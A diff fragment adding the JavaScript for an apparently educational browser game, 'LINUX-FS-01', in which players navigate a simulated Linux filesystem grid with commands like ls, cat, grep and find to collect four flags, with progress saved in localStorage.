+        'north': [0,-1], 'n': [0,-1],
+        'south': [0,1],  's': [0,1],
+        'east':  [1,0],  'e': [1,0],
+        'west':  [-1,0], 'w': [-1,0]
+    };
+
+    var dir = args[0].toLowerCase();
+    if (!dirMap[dir]) {
+        printLine('Unknown direction: ' + args[0], 'error');
+        printLine('Use: north/south/east/west (or n/s/e/w)', 'system');
+        return;
+    }
+
+    var d = dirMap[dir];
+    var newCol = STATE.position.col + d[0];
+    var newRow = STATE.position.row + d[1];
+
+    if (newCol < 0 || newCol >= COLS || newRow < 0 || newRow >= ROWS) {
+        printLine('Filesystem boundary. Cannot move ' + dir + '.', 'error');
+        return;
+    }
+
+    var cellType = GRID_MAP[newRow][newCol];
+
+    if (cellType === 'wall') {
+        printLine('Inaccessible. No traversable path ' + dir + '.', 'error');
+        return;
+    }
+
+    // Move
+    STATE.position = { col: newCol, row: newRow };
+    STATE.visibility[newCol + ',' + newRow] = 'visited';
+
+    if (cellType !== 'empty') {
+        STATE.dirsVisited.add(cellType);
+    }
+
+    revealAdjacent(newCol, newRow);
+
+    // Print
+    var dirFull = { n:'north', s:'south', e:'east', w:'west' };
+    var dirName = dirFull[dir] || dir;
+    if (cellType === 'empty') {
+        printLine('cd ' + dirName + '... Empty path.', 'system');
+    } else {
+        var info = CELL_INFO[cellType];
+        printLine('cd ' + dirName + '... ' + info.label + ' ' + info.ip, 'success');
+        printLine(info.desc, 'info');
+        printLine('Permissions: ' + info.os, 'node-info');
+    }
+
+    updateGrid();
+    saveState();
+}
+
+function cmdLs() {
+    var cellType = getCurrentCellType();
+    if (cellType === 'empty' || cellType === 'wall') {
+        printLine('Not inside a directory. Move to a named directory first.', 'error');
+        return;
+    }
+
+    var info = CELL_INFO[cellType];
+    printLine(info.ports.join('  '), 'node-info');
+}
+
+function cmdCat(args) {
+    if (!args.length) {
+        printLine('Usage: cat <filename>', 'error');
+        return;
+    }
+
+    var filename = args[0];
+    var cellType = getCurrentCellType();
+
+    if (cellType === 'empty' || cellType === 'wall') {
+        printLine('cat: not inside a directory', 'error');
+        return;
+    }
+
+    var info = CELL_INFO[cellType];
+    var files = FILE_CONTENTS[cellType];
+
+    if (!files || !files[filename]) {
+        // Check if the file exists in ports but has no content defined
+        var inPorts = info.ports.indexOf(filename) !== -1;
+        if (inPorts) {
+            printLine('cat: ' + filename + ': unable to read', 'error');
+        } else {
+            printLine('cat: ' + filename + ': No such file or directory', 'error');
+        }
+        return;
+    }
+
+    var content = files[filename];
+
+    // Check if this is a flag file
+    if (info.hasFlag && filename === info.flagFile) {
+        printLine(content, 'flag');
+        if (!STATE.flagsFound.has(cellType)) {
+            STATE.flagsFound.add(cellType);
+            printLine('', 'system');
+            printLine('[!] FLAG CAPTURED', 'success');
+            checkObjectives();
+        }
+    } else {
+        // Print each line of file content
+        var lines = content.split('\n');
+        lines.forEach(function(l) { printLine(l, 'node-info'); });
+    }
+
+    saveState();
+}
+
+function cmdGrep(args) {
+    if (!args.length) {
+        printLine('Usage: grep <pattern>', 'error');
+        return;
+    }
+
+    var pattern = args.join(' ').toLowerCase();
+    var cellType = getCurrentCellType();
+
+    if (cellType === 'empty' || cellType === 'wall') {
+        printLine('grep: not inside a directory', 'error');
+        return;
+    }
+
+    var files = FILE_CONTENTS[cellType];
+    if (!files) {
+        printLine('(no results)', 'system');
+        return;
+    }
+
+    var found = false;
+    Object.keys(files).forEach(function(fname) {
+        var content = files[fname];
+        var lines = content.split('\n');
+        lines.forEach(function(line) {
+            if (line.toLowerCase().indexOf(pattern) !== -1) {
+                printLine(fname + ': ' + line, 'node-info');
+                found = true;
+            }
+        });
+    });
+
+    if (!found) {
+        printLine('(no results for "' + args.join(' ') + '")', 'system');
+    }
+}
+
+function cmdFind(args) {
+    if (!args.length) {
+        printLine('Usage: find <pattern>', 'error');
+        return;
+    }
+
+    var pattern = args.join(' ').toLowerCase();
+    var found = false;
+
+    // Search all visited cells
+    for (var r = 0; r < ROWS; r++) {
+        for (var c = 0; c < COLS; c++) {
+            var type = GRID_MAP[r][c];
+            if (type === 'empty' || type === 'wall') continue;
+
+            var key = c + ',' + r;
+            var vis = STATE.visibility[key] || 'hidden';
+            if (vis !== 'visited' && !(STATE.position.col === c && STATE.position.row === r)) continue;
+
+            var info = CELL_INFO[type];
+            info.ports.forEach(function(p) {
+                if (p.toLowerCase().indexOf(pattern) !== -1) {
+                    printLine(info.label + '/' + p, 'node-info');
+                    found = true;
+                }
+            });
+        }
+    }
+
+    if (!found) {
+        printLine('(no files matching "' + args.join(' ') + '" in visited directories)', 'system');
+        printLine('Hint: visit more directories to expand search scope.', 'info');
+    }
+}
+
+function cmdPwd() {
+    var cellType = getCurrentCellType();
+    if (cellType === 'empty' || cellType === 'wall') {
+        printLine('(traversal path \u2014 no named directory)', 'system');
+    } else {
+        var info = CELL_INFO[cellType];
+        printLine(info.label, 'heading');
+    }
+}
+
+function cmdPing(args) {
+    if (!args.length) {
+        printLine('Usage: ping <directory name>', 'error');
+        return;
+    }
+
+    var target = args.join(' ');
+    var node = resolveNode(target);
+
+    if (!node) {
+        printLine('ping: unknown directory ' + target, 'error');
+        return;
+    }
+
+    if (node.visibility === 'hidden') {
+        printLine('Directory not yet discovered. Explore the filesystem first.', 'error');
+        return;
+    }
+
+    var info = node.info;
+    printLine('PING ' + info.label + ' ' + info.ip, 'system');
+    printLine('Directory exists \u2014 ' + info.desc, 'info');
+    printLine('Permissions: ' + info.os, 'node-info');
+    printLine('Contents: ' + info.ports.length + ' entries', 'node-info');
+}
+
+function cmdStatus() {
+    var col = STATE.position.col;
+    var row = STATE.position.row;
+    var cellType = getCurrentCellType();
+    var posLabel = (cellType !== 'empty' && cellType !== 'wall') ? CELL_INFO[cellType].label : '(empty path)';
+
+    printLine('', 'system');
+    printLine('\u2550\u2550\u2550 STATUS \u2550\u2550\u2550', 'heading');
+    printLine('Position: (' + col + ',' + row + ') \u2014 ' + posLabel, 'info');
+    printLine('Directories visited: ' + STATE.dirsVisited.size + ' / 9', 'info');
+    printLine('Flags captured: ' + STATE.flagsFound.size + ' / 4', 'info');
+    printLine('Commands used: ' + STATE.commandCount, 'info');
+    printLine('', 'system');
+    printLine('Objectives:', 'heading');
+
+    var objText = [
+        'Find FLAG-1 in /root',
+        'Find FLAG-2 in /var/log',
+        'Find FLAG-3 in /opt',
+        'Find FLAG-4 in /srv'
+    ];
+
+    STATE.objectives.forEach(function(done, i) {
+        printLine((done ? ' [X] ' : ' [ ] ') + objText[i], done ? 'success' : 'system');
+    });
+}
+
+// === Utility ===
+
+function padRight(str, len) {
+    while (str.length < len) str += ' ';
+    return str;
+}
+
+// === Objectives ===
+
+function checkObjectives() {
+    var prev = STATE.objectives.slice();
+
+    // 1. FLAG-1 in /root
+    STATE.objectives[0] = STATE.flagsFound.has('root-home');
+
+    // 2. FLAG-2 in /var/log
+    STATE.objectives[1] = STATE.flagsFound.has('var-log');
+
+    // 3. FLAG-3 in /opt
+    STATE.objectives[2] = STATE.flagsFound.has('opt-dir');
+
+    // 4. FLAG-4 in /srv
+    STATE.objectives[3] = STATE.flagsFound.has('srv-dir');
+
+    // Announce newly completed objectives
+    STATE.objectives.forEach(function(done, i) {
+        if (done && !prev[i]) {
+            printLine('', 'system');
+            printLine('[OBJECTIVE COMPLETE] ' + OBJ_LABELS[i], 'success');
+        }
+    });
+
+    updateObjectivesUI();
+
+    // All complete?
+    if (STATE.objectives.every(Boolean) && !STATE.completed) {
+        STATE.completed = true;
+        var elapsed = Math.floor((Date.now() - STATE.startTime) / 1000);
+
+        // Save completion record
+        var stats = {
+            completed: true,
+            time: elapsed,
+            commands: STATE.commandCount,
+            flagsFound: STATE.flagsFound.size,
+            dirsVisited: STATE.dirsVisited.size,
+            timestamp: Date.now()
+        };
+        try {
+            localStorage.setItem('hexworth_operator_linuxfs01', JSON.stringify(stats));
+            localStorage.removeItem('hexworth_operator_linuxfs01_save');
+        } catch (e) {}
+
+        // ModuleProgress completion
+        try {
+            if (typeof ModuleProgress !== 'undefined') {
+                ModuleProgress.complete('operator', 'linux-fs-01', { returnUrl: '../index.html' });
+            }
+        } catch(e) {}
+
+        printLine('', 'system');
+        printLine('\u2550\u2550\u2550 ALL FLAGS CAPTURED \u2550\u2550\u2550', 'heading');
+        printLine('Mission LINUX-FS-01 accomplished.', 'success');
+
+        document.getElementById('header-status').textContent = 'COMPLETE';
+        document.getElementById('header-status').style.color = '#39ff14';
+
+        setTimeout(function() { showMissionComplete(elapsed); }, 1500);
+    }
+}
+
+function updateObjectivesUI() {
+    STATE.objectives.forEach(function(done, i) {
+        var el = document.getElementById('obj-' + i);
+        if (!el) return;
+        var check = el.querySelector('.obj-check');
+        if (done) {
+            el.classList.add('complete');
+            check.textContent = '\u2713';
+        } else {
+            el.classList.remove('complete');
+            check.textContent = '';
+        }
+    });
+}
+
+function showMissionComplete(elapsed) {
+    var mins = Math.floor(elapsed / 60);
+    var secs = elapsed % 60;
+    var timeStr = mins > 0 ? mins + 'm ' + secs + 's' : secs + 's';
+
+    document.getElementById('stat-flags').textContent = STATE.flagsFound.size;
+    document.getElementById('stat-commands').textContent = STATE.commandCount;
+    document.getElementById('stat-time').textContent = timeStr;
+
+    document.getElementById('mission-complete').classList.add('visible');
+}
+
+// === Save / Load ===
+
+function saveState() {
+    try {
+        var data = {
+            position: STATE.position,
+            visibility: STATE.visibility,
+            objectives: STATE.objectives,
+            dirsVisited: Array.from(STATE.dirsVisited),
+            flagsFound: Array.from(STATE.flagsFound),
+            commandCount: STATE.commandCount,
+            startTime: STATE.startTime
+        };
+        localStorage.setItem('hexworth_operator_linuxfs01_save', JSON.stringify(data));
+    } catch (e) {}
+}
+
+function loadState() {
+    try {
+        var saved = localStorage.getItem('hexworth_operator_linuxfs01_save');
+        if (!saved) return false;
+        var data = JSON.parse(saved);
+        STATE.position = data.position;
+        STATE.visibility = data.visibility;
+        STATE.objectives = data.objectives;
+        STATE.dirsVisited = new Set(data.dirsVisited);
+        STATE.flagsFound = new Set(data.flagsFound);
+        STATE.commandCount = data.commandCount;
+        STATE.startTime = data.startTime;
+        return true;
+    } catch (e) {
+        return false;
+    }
+}
+
+function resetState() {
+    STATE = {
+        position: { col: 0, row: 0 },
+        visibility: {},
+        objectives: [false, false, false, false],
+        dirsVisited: new Set(),
+        flagsFound: new Set(),
+        commandCount: 0,
+        commandHistory: [],
+        historyIndex: -1,
+        startTime: Date.now(),
+        completed: false
+    };
+    // Starting cell
+    STATE.visibility['0,0'] = 'visited';
+    STATE.dirsVisited.add('root-home');
+    revealAdjacent(0, 0);
+}
+
+// === Command Parser ===
+
+function executeCommand(input) {
+    STATE.commandCount++;
+
+    // Echo
+    printLine('root@hexworth:~# ' + input, 'prompt-echo');
+
+    var parts = input.trim().split(/\s+/);
+    var cmd = parts[0].toLowerCase();
+    var args = parts.slice(1);
+
+    switch (cmd) {
+        case 'scan':   cmdScan(); break;
+        case 'move':   cmdMove(args); break;
+        case 'ls':     cmdLs(); break;
+        case 'cat':    cmdCat(args); break;
+        case 'grep':   cmdGrep(args); break;
+        case 'find':   cmdFind(args); break;
+        case 'pwd':    cmdPwd(); break;
+        case 'ping':   cmdPing(args); break;
+        case 'status': cmdStatus(); break;
+        case 'help':   cmdHelp(); break;
+        case 'clear':
+            document.getElementById('term-output').innerHTML = '';
+            break;
+        case 'cd':
+            printLine('Use "move <direction>" to navigate the filesystem grid.', 'info');
+            printLine('Directions: north/south/east/west (or n/s/e/w)', 'system');
+            break;
+        default:
+            printLine(cmd + ': command not found', 'error');
+            printLine('Type "help" for available commands.', 'system');
+    }
+}
+
+// === Terminal Input ===
+
+function setupInput() {
+    var input = document.getElementById('term-input');
+
+    input.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            var cmd = this.value.trim();
+            if (cmd) {
+                STATE.commandHistory.push(cmd);
+                STATE.historyIndex = STATE.commandHistory.length;
+                executeCommand(cmd);
+            }
+            this.value = '';
+        } else if (e.key === 'ArrowUp') {
+            e.preventDefault();
+            if (STATE.historyIndex > 0) {
+                STATE.historyIndex--;
+                this.value = STATE.commandHistory[STATE.historyIndex];
+            }
+        } else if (e.key === 'ArrowDown') {
+            e.preventDefault();
+            if (STATE.historyIndex < STATE.commandHistory.length - 1) {
+                STATE.historyIndex++;
+                this.value = STATE.commandHistory[STATE.historyIndex];
+            } else {
+                STATE.historyIndex = STATE.commandHistory.length;
+                this.value = '';
+            }
+        }
+    });
+
+    // Click terminal area to focus input
+    document.getElementById('term-panel').addEventListener('click', function(e) {
+        if (e.target.tagName !== 'INPUT') input.focus();
+    });
+}
+
+// === Mission Briefing ===
+
+function showBriefing() {
+    printLine('\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557', 'heading');
+    printLine('\u2551  MISSION: LINUX-FS-01 \u2014 ROOT ACCESS      \u2551', 'heading');
+    printLine('\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563', 'heading');
+    printLine('\u2551  You have root access on a target system.  \u2551', 'heading');
+    printLine('\u2551  Explore the filesystem, search for hidden \u2551', 'heading');
+    printLine('\u2551  flags in four key directories. Use ls,    \u2551', 'heading');
+    printLine('\u2551  cat, grep, and find to locate all four.   \u2551', 'heading');
+    printLine('\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D', 'heading');
+    printLine('', 'system');
+    printLine('Commands: scan, move, ls, cat, grep, find, pwd,', 'info');
+    printLine('          ping, status, help, clear.', 'info');
+    printLine('', 'system');
+    printLine('[SYS] Root shell active at /root', 'success');
+    printLine('[SYS] Type "help" for command reference', 'info');
+    printLine('[SYS] Type "ls" to list directory contents', 'info');
+    printLine('[SYS] Type "scan" to survey adjacent directories', 'info');
+    printLine('', 'system');
+}
+
+// === Init ===
+
+function init() {
+    buildGrid();
+    setupInput();
+
+    var restored = loadState();
+    if (restored && !STATE.completed) {
+        printLine('[SYS] Session restored from save.', 'system');
+        printLine('[SYS] Type "status" to review position.', 'info');
+        printLine('', 'system');
+    } else {
+        resetState();
+        showBriefing();
+    }
+
+    updateGrid();
+    updateObjectivesUI();
+    document.getElementById('term-input').focus();
+}
+
+document.addEventListener('DOMContentLoaded', init);
+</script>
+
+</body>
+</html>
